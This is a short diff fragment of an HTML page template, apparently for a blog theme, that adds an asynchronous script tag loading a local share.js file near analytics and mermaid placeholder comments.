         <div class="sidebar sidebar-hide">
@@ -1315,6 +1247,8 @@
         <!-- CNZZ -->
         
         <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
         
         <!-- mermaid -->
         
